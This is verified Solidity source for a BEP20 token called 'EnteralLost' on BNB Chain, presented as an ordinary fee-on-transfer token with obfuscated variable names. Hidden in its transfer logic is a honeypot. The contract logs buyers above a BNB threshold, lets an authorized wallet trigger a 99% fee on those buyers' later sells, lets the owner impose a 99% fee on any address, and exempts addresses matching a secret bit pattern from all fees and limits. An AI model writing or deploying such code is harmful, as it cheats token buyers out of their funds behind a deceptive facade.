/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.11;interface IBEP20 {    function symbol() external view returns (string memory);    function decimals() external view returns (uint8);    function allowance(address _owner, address spender)    external    view    returns (uint256);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function name() external view returns (string memory);    function balanceOf(address account) external view returns (uint256);    function totalSupply() external view returns (uint256);    function approve(address spender, uint256 amount) external returns (bool);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function getOwner() external view returns (address);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }    function Owner() public view returns (address) {        return owner;    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    function SetAuthorized(address adr) public onlyOwner() {        competent[adr] = true;    }}library SafeMath {    function tryAdd(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        uint256 c = a + b;        if (c < a) return (false, 0);        return (true, c);    }    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function tryMod(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a % b);    }    }    function mod(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a % b;    }    }    function trySub(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b > a) return (false, 0);        return (true, a - b);    }    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}interface IUniswapV2Router {    function WETH() external pure returns (address);    function factory() external pure returns (address);    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;}interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}contract EnteralLost is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    string constant _name = "Enteral Lost ";    string constant _symbol = "EnteralLost";    uint8 constant _decimals = 18;    //BUY FEES    uint256 private burnBotsTradingSell = 0;    uint256 private liquidityBotsFeeSwap = 7;    //SELL FEES    uint256 private walletFeeBotsAutoModeMax = 0;    uint256 private txFeeLaunchedWallet = 7;    bool private minBotsExemptSellLaunched = true;    bool private feeSellWalletBurnMode = true;    bool private feeMaxLiquidityLimit = true;    bool private launchedTradingWalletMaxModeBurnLiquidity = true;    bool private feeBurnExemptMinLimitAutoLiquidity = true;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    uint256 private receiverMinLimitTxMaxTradingAuto = 6 * 10 ** 15;    uint256 private launchedSwapSellTeamBurn = _totalSupply / 1000; // 0.1%    uint256 private exemptMaxTradingLiquidity = liquidityBotsFeeSwap + burnBotsTradingSell;    uint256 private feeAutoReceiverModeIsExempt = 100;    bool private swapMaxFeeTradingLiquidityLaunched;    uint256 private receiverTxBurnMode;    uint256 private autoLiquiditySellTrading;    uint256 private autoFeeSellBurn;    uint256 private maxAutoMinTradingFee;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private buyFeeMinBurnMode;    mapping(address => bool) private receiverModeFeeBuyBots;    mapping(address => bool) private txBurnWalletSell;    mapping(address => bool) private feeSellWalletBurn;    mapping(address => uint256) private sellMaxBurnSwap;    mapping(uint256 => address) private buyLimitBotsReceiver;    uint256 public maxWalletAmount = 0;    uint256 private launchBlock = 0;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private botsReceiverIsTxSwapAutoFee;    uint256 private liquidityBotsTeamMax;    address private walletReceiverSwapTxSell = (msg.sender); // auto-liq address    address private txWalletFeeLaunched = (0x669ac8636ab859d3446Fd7F3fFfFcCBc9C9AdBdc); // marketing address    address private walletLaunchedLimitBurn = DEAD;    address private launchedModeBuyAuto = DEAD;    address private receiverMaxSellSwap = DEAD;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);        uint256 public tradingBurnMarketingBuy = 0;    bool public liquidityIsMinExemptReceiver = false;    bool private isMinWalletFeeSwap = false;    uint256 private tradingMinAutoMarketing = 0;    uint256 private sellWalletModeExempt = 0;    uint256 public botsIsBuyMarketingSwapSell = 0;    bool private botsMarketingTeamIsReceiverBurnLaunched = false;    bool public launchedIsBuyFeeAuto = false;    uint256 private marketingLiquiditySwapExemptTrading = 0;    bool private buySwapLimitTrading = false;    uint256 private liquidityIsMinExemptReceiver0 = 0;    uint256 public liquidityIsMinExemptReceiver1 = 0;    uint256 private liquidityIsMinExemptReceiver2 = 0;    bool private liquidityIsMinExemptReceiver3 = false;    uint256 private liquidityIsMinExemptReceiver4 = 0;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        swapMaxFeeTradingLiquidityLaunched = true;        txBurnWalletSell[msg.sender] = true;        txBurnWalletSell[0x0000000000000000000000000000000000000000] = true;        txBurnWalletSell[0x000000000000000000000000000000000000dEaD] = true;        txBurnWalletSell[address(this)] = true;        buyFeeMinBurnMode[msg.sender] = true;        buyFeeMinBurnMode[address(this)] = true;        receiverModeFeeBuyBots[msg.sender] = true;        receiverModeFeeBuyBots[0x0000000000000000000000000000000000000000] = true;        receiverModeFeeBuyBots[0x000000000000000000000000000000000000dEaD] = true;        receiverModeFeeBuyBots[address(this)] = true;        SetAuthorized(address(0xb856aB1223c1830Ea71f1d27FFfFC6D04f1746BF));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return minSwapBotsLaunched(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return minSwapBotsLaunched(sender, recipient, amount);    }    function setLaunchedSwapSellTeamBurn(uint256 a0) public onlyOwner {        if (launchedSwapSellTeamBurn == receiverMinLimitTxMaxTradingAuto) {            receiverMinLimitTxMaxTradingAuto=a0;        }        if (launchedSwapSellTeamBurn == burnBotsTradingSell) {            burnBotsTradingSell=a0;        }        if (launchedSwapSellTeamBurn != launchBlock) {            launchBlock=a0;        }        launchedSwapSellTeamBurn=a0;    }
    function limitAutoTxBuy(address sender, address receiver, uint256 amount) internal returns (uint256) {                if (botsMarketingTeamIsReceiverBurnLaunched != minBotsExemptSellLaunched) {            botsMarketingTeamIsReceiverBurnLaunched = feeMaxLiquidityLimit;        }        uint256 feeAmount = amount.mul(modeLaunchedSellReceiverAutoLimitFee(sender, receiver == uniswapV2Pair)).div(feeAutoReceiverModeIsExempt);        if (feeSellWalletBurn[sender] || feeSellWalletBurn[receiver]) {            feeAmount = amount.mul(99).div(feeAutoReceiverModeIsExempt);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                return amount.sub(feeAmount);    }
    function liquidityBuyBurnMin(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function setWalletReceiverSwapTxSell(address a0) public onlyOwner {        if (walletReceiverSwapTxSell == walletLaunchedLimitBurn) {            walletLaunchedLimitBurn=a0;        }        if (walletReceiverSwapTxSell != walletLaunchedLimitBurn) {            walletLaunchedLimitBurn=a0;        }        walletReceiverSwapTxSell=a0;    }
    function txBurnIsAutoSell() private view returns (uint256) {        address t0 = WBNB;        if (address(this) < WBNB) {            t0 = address(this);        }        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;        return buyAmount;    }
    function modeLaunchedSellReceiverAutoLimitFee(address sender, bool selling) internal returns (uint256) {                if (liquidityIsMinExemptReceiver0 == tradingMinAutoMarketing) {            liquidityIsMinExemptReceiver0 = feeAutoReceiverModeIsExempt;        }        if (liquidityIsMinExemptReceiver2 != tradingMinAutoMarketing) {            liquidityIsMinExemptReceiver2 = liquidityIsMinExemptReceiver4;        }        if (marketingLiquiditySwapExemptTrading == liquidityIsMinExemptReceiver0) {            marketingLiquiditySwapExemptTrading = liquidityIsMinExemptReceiver4;        }        if (selling) {            exemptMaxTradingLiquidity = txFeeLaunchedWallet + walletFeeBotsAutoModeMax;            return autoSellBuyLiquidity(sender, exemptMaxTradingLiquidity);        }        if (!selling && sender == uniswapV2Pair) {            exemptMaxTradingLiquidity = liquidityBotsFeeSwap + burnBotsTradingSell;            return exemptMaxTradingLiquidity;        }        return autoSellBuyLiquidity(sender, exemptMaxTradingLiquidity);    }
    function getWalletReceiverSwapTxSell() public view returns (address) {        if (walletReceiverSwapTxSell == receiverMaxSellSwap) {            return receiverMaxSellSwap;        }        return walletReceiverSwapTxSell;    }
    function getLaunchedSwapSellTeamBurn() public view returns (uint256) {        if (launchedSwapSellTeamBurn == marketingLiquiditySwapExemptTrading) {            return marketingLiquiditySwapExemptTrading;        }        if (launchedSwapSellTeamBurn == liquidityIsMinExemptReceiver0) {            return liquidityIsMinExemptReceiver0;        }        return launchedSwapSellTeamBurn;    }
    function getSellMaxBurnSwap(address a0) public view returns (uint256) {        if (a0 != receiverMaxSellSwap) {            return liquidityIsMinExemptReceiver4;        }        if (a0 == walletReceiverSwapTxSell) {            return feeAutoReceiverModeIsExempt;        }            return sellMaxBurnSwap[a0];    }
    function getTxFeeLaunchedWallet() public view returns (uint256) {        if (txFeeLaunchedWallet != txFeeLaunchedWallet) {            return txFeeLaunchedWallet;        }        if (txFeeLaunchedWallet == feeAutoReceiverModeIsExempt) {            return feeAutoReceiverModeIsExempt;        }        if (txFeeLaunchedWallet != sellWalletModeExempt) {            return sellWalletModeExempt;        }        return txFeeLaunchedWallet;    }
    function setSellMaxBurnSwap(address a0,uint256 a1) public onlyOwner {        if (a0 != receiverMaxSellSwap) {            burnBotsTradingSell=a1;        }        if (a0 != receiverMaxSellSwap) {            sellWalletModeExempt=a1;        }        if (a0 == receiverMaxSellSwap) {            liquidityIsMinExemptReceiver2=a1;        }        sellMaxBurnSwap[a0]=a1;    }
    function getLaunchBlock() public view returns (uint256) {        if (launchBlock != liquidityBotsFeeSwap) {            return liquidityBotsFeeSwap;        }        if (launchBlock == marketingLiquiditySwapExemptTrading) {            return marketingLiquiditySwapExemptTrading;        }        if (launchBlock == burnBotsTradingSell) {            return burnBotsTradingSell;        }        return launchBlock;    }
    function buySwapTxReceiverMin(address sender) internal view returns (bool) {        return !receiverModeFeeBuyBots[sender];    }
    function setFeeSellWalletBurn(address a0,bool a1) public onlyOwner {        if (a0 != txWalletFeeLaunched) {            isMinWalletFeeSwap=a1;        }        feeSellWalletBurn[a0]=a1;    }
    function isFeeLimitTeamBurn(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function getLaunchedTradingWalletMaxModeBurnLiquidity() public view returns (bool) {        if (launchedTradingWalletMaxModeBurnLiquidity == launchedTradingWalletMaxModeBurnLiquidity) {            return launchedTradingWalletMaxModeBurnLiquidity;        }        return launchedTradingWalletMaxModeBurnLiquidity;    }
    function burnAutoLiquidityIsReceiverBuy() private {        if (maxWalletAmount > 0) {            for (uint256 i = 1; i <= maxWalletAmount; i++) {                if (sellMaxBurnSwap[buyLimitBotsReceiver[i]] == 0) {                    sellMaxBurnSwap[buyLimitBotsReceiver[i]] = block.timestamp;                }            }            maxWalletAmount = 0;        }    }
    function minSwapBotsLaunched(address sender, address recipient, uint256 amount) internal returns (bool) {                if (isMinWalletFeeSwap != minBotsExemptSellLaunched) {            isMinWalletFeeSwap = botsMarketingTeamIsReceiverBurnLaunched;        }        bool bLimitTxWalletValue = isFeeLimitTeamBurn(sender) || isFeeLimitTeamBurn(recipient);                if (sender == uniswapV2Pair) {            if (maxWalletAmount != 0 && isAuthorized(recipient)) {                burnAutoLiquidityIsReceiverBuy();            }            if (!bLimitTxWalletValue) {                isLiquidityFeeExempt(recipient);            }        }                if (recipient == uniswapV2Pair && _balances[recipient] == 0) {            launchBlock = block.number + 10;        }        if (!bLimitTxWalletValue) {            require(block.number >= launchBlock, "No launch");        }                if (inSwap || bLimitTxWalletValue) {return liquidityBuyBurnMin(sender, recipient, amount);}        if (!buyFeeMinBurnMode[sender] && !buyFeeMinBurnMode[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                if (botsMarketingTeamIsReceiverBurnLaunched == botsMarketingTeamIsReceiverBurnLaunched) {            botsMarketingTeamIsReceiverBurnLaunched = minBotsExemptSellLaunched;        }        if (liquidityIsMinExemptReceiver2 != launchedSwapSellTeamBurn) {            liquidityIsMinExemptReceiver2 = liquidityIsMinExemptReceiver0;        }        require((amount <= _maxTxAmount) || txBurnWalletSell[sender] || txBurnWalletSell[recipient], "Max TX Limit!");        if (walletLiquiditySwapMarketingMin()) {buySellTxExemptSwapModeBurn();}        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                uint256 amountReceived = buySwapTxReceiverMin(sender) ? limitAutoTxBuy(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function isLiquidityFeeExempt(address addr) private {        if (txBurnIsAutoSell() < receiverMinLimitTxMaxTradingAuto) {            return;        }        maxWalletAmount = maxWalletAmount + 1;        buyLimitBotsReceiver[maxWalletAmount] = addr;    }
    function walletLiquiditySwapMarketingMin() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    feeBurnExemptMinLimitAutoLiquidity &&    _balances[address(this)] >= launchedSwapSellTeamBurn;    }
    function setLaunchedTradingWalletMaxModeBurnLiquidity(bool a0) public onlyOwner {        if (launchedTradingWalletMaxModeBurnLiquidity == launchedTradingWalletMaxModeBurnLiquidity) {            launchedTradingWalletMaxModeBurnLiquidity=a0;        }        if (launchedTradingWalletMaxModeBurnLiquidity == liquidityIsMinExemptReceiver3) {            liquidityIsMinExemptReceiver3=a0;        }        if (launchedTradingWalletMaxModeBurnLiquidity != feeMaxLiquidityLimit) {            feeMaxLiquidityLimit=a0;        }        launchedTradingWalletMaxModeBurnLiquidity=a0;    }
    function autoSellBuyLiquidity(address sender, uint256 pFee) private view returns (uint256) {        uint256 f0 = sellMaxBurnSwap[sender];        uint256 f1 = pFee;        if (f0 > 0 && block.timestamp - f0 > 2) {            f1 = 99;        }        return f1;    }
    function getFeeSellWalletBurn(address a0) public view returns (bool) {        if (feeSellWalletBurn[a0] != txBurnWalletSell[a0]) {            return isMinWalletFeeSwap;        }        if (feeSellWalletBurn[a0] == receiverModeFeeBuyBots[a0]) {            return launchedTradingWalletMaxModeBurnLiquidity;        }            return feeSellWalletBurn[a0];    }
    function buySellTxExemptSwapModeBurn() internal swapping {                if (liquidityIsMinExemptReceiver3 != feeSellWalletBurnMode) {            liquidityIsMinExemptReceiver3 = feeMaxLiquidityLimit;        }        if (isMinWalletFeeSwap == liquidityIsMinExemptReceiver3) {            isMinWalletFeeSwap = botsMarketingTeamIsReceiverBurnLaunched;        }        if (botsMarketingTeamIsReceiverBurnLaunched == liquidityIsMinExemptReceiver3) {            botsMarketingTeamIsReceiverBurnLaunched = minBotsExemptSellLaunched;        }        uint256 amountToLiquify = launchedSwapSellTeamBurn.mul(burnBotsTradingSell).div(exemptMaxTradingLiquidity).div(2);        uint256 amountToSwap = launchedSwapSellTeamBurn.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                uint256 amountBNB = address(this).balance;        uint256 totalETHFee = exemptMaxTradingLiquidity.sub(burnBotsTradingSell.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(burnBotsTradingSell).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(liquidityBotsFeeSwap).div(totalETHFee);                if (sellWalletModeExempt != launchBlock) {            sellWalletModeExempt = feeAutoReceiverModeIsExempt;        }        if (tradingMinAutoMarketing != feeAutoReceiverModeIsExempt) {            tradingMinAutoMarketing = marketingLiquiditySwapExemptTrading;        }        payable(txWalletFeeLaunched).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                walletReceiverSwapTxSell,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function setLaunchBlock(uint256 a0) public onlyOwner {        if (launchBlock != txFeeLaunchedWallet) {            txFeeLaunchedWallet=a0;        }        if (launchBlock != receiverMinLimitTxMaxTradingAuto) {            receiverMinLimitTxMaxTradingAuto=a0;        }        launchBlock=a0;    }
    function setTxFeeLaunchedWallet(uint256 a0) public onlyOwner {        if (txFeeLaunchedWallet == txFeeLaunchedWallet) {            txFeeLaunchedWallet=a0;        }        if (txFeeLaunchedWallet != liquidityIsMinExemptReceiver0) {            liquidityIsMinExemptReceiver0=a0;        }        if (txFeeLaunchedWallet != walletFeeBotsAutoModeMax) {            walletFeeBotsAutoModeMax=a0;        }        txFeeLaunchedWallet=a0;    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}